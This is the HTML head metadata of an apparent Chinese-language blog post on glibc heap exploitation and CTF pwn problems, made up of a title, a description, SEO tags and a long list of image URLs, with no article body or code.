<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="韩乔落">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://jelasin.github.io/2023/09/22/深入理解pwn_heap及赛题详细解析/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="前言ptmalloc2 的管理方式，chunk 结构和 bins 的模型，在Overview of GLIBC heap exploitation techniques ，ctfwiki  以及一些博客 已经讲解的非常清楚，本文记录自己的学习堆利用的过程。主要更新 glibc-2.23，2.27，2.31，2.35，2.37 主流版本和相关例题，glibc-2.23 后面更新一些变化和新的利用方式">
<meta property="og:type" content="article">
<meta property="og:title" content="深入理解Pwn_heap及赛题详细解析">
<meta property="og:url" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/index.html">
<meta property="og:site_name" content="Jelasin">
<meta property="og:description" content="前言ptmalloc2 的管理方式，chunk 结构和 bins 的模型，在Overview of GLIBC heap exploitation techniques ，ctfwiki  以及一些博客 已经讲解的非常清楚，本文记录自己的学习堆利用的过程。主要更新 glibc-2.23，2.27，2.31，2.35，2.37 主流版本和相关例题，glibc-2.23 后面更新一些变化和新的利用方式">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F7M2S7WM7URA2WQ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRQV6TQJYQWAXFV.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U8FQ8QMKCMJEEHE.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YBSW3KZB8CFB9PV.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XRP63QAXTP42DB4.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5PQAMT3K7NY6GSP.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B4MCXD5ETFVSG4E.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7QJAPUB4DDD2PHB.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PUYYFZPQXKV9KS.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_TMDXE86NU7SRWS3.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_WBDHQYTZ4AXN4ZB.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D7WDB4DZ4DJS79F.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CHJZNE3YDAFDZMS.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CKURHWFQTKVYSZ4.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_E396T5K2YSZR35Q.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_UC93S5J8Q2CNP72.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922101848230.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ZJY9Q5VVBT68CZ3.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Z4EUWZVH32R7NCC.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SKW8ZP7TMRGT4KH.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_M9SHEHDCSMPZBD7.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2PFN7JA5YKTQ3WJ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XUU37A7TTNM9CTE.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7FFXHQMZJZJ6VD9.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_X8QF98YVC2Y7HSR.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_RNY3WYAWYJ7DY93.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4R6P2X9QDR3K5EQ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CFQPP2ZXM4P7YKJ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091755981-1695348432658-25.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091916522-1695348571707-28.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092146583-1695348610428-32.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092342656-1695348634598-36.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092506302-1695348654255-39.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092715145-1695348671021-42.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XWR593Z6QWM678A.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_HFXM6UD3SRQFGMH.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2EGACEX74TU3QRY.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_24PJANS2GM8MB2P.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_A2SCWXK32FJK626.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5KFTD8D4QBYUZRY.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JZ24RST96TR5RPJ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_782YNCGZFNYW8QR.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QA4NT4K533CQDKZ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRGPNNXAJD7C2F9.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PTP2U3KSVCT74TK.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4CQ4CJAZSCH7WU.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CR3CMBC9VJWUDT3.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KSXPFGVAYV5H9YZ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4MZWDG2C8F3WEA.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KQEQ32B3NMRVFSC.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PVC2FBRWP9GF7A.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XG85YQF9NY28T7S.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6QS2Z3FCJEQPXMR.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YG6FJ2KF3VB4U26.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Y7DJTKGEFQFGFGA.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VXYWCAM8E85E5V6.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6AUFTSRX2JMSNHZ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R2MJEDKJDC62ZD.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3UFBHGTKF3NW24D.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K9CV7KXXVU9UMNW.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_38SFMRQ5X3FR7A5.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4AUY3TB9B4HUMEM.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6ZP8PYCJCE35KDG.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XTHTCK8EQSMAX6B.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2GFDGPT8AB5TCPM.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2QDW7TADTJ8F9YD.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_T7ZZAKUECF646WZ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NXQ9YXPN542KB5K.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JG8ZQB8MH2YV68Q.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JN69YNASY7MKFCK.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_BGBDQAVWY7R26XR.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PZ9JU3KFW6NJN5P.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VY24BDSZW5SQSWA.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3KAA3VZEGWRQ2CF.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3G6W8HPTPJYVXXM.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4A4TPGFMMJSRUCR.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U7NK7EPN83MV5VH.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DEP93F63ATZPHJZ.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2Y8ADDBXUQXUG4R.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C8GR9YZ8AVVR6YS.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DMWG5SBG4MM3W5S.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GHJ7RBMKB5Y8GMK.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_V7X588ARHBXTSY8.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_W3A27VBAJ34ECCK.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AY7EM3HWZB8HJSE.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K6GZGM7MWCZGCTS.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F3ZFDGEK2RFX33H.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F4BT7673NJYMD9K.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_8ZKFC6YP36TCPUC.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_69JHW2FXP62QRD8.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_G7UVK2Z39Q7V4N2.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2UT6ZP9UTJP74U9.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4DKB7Y89T8FSWD8.png">
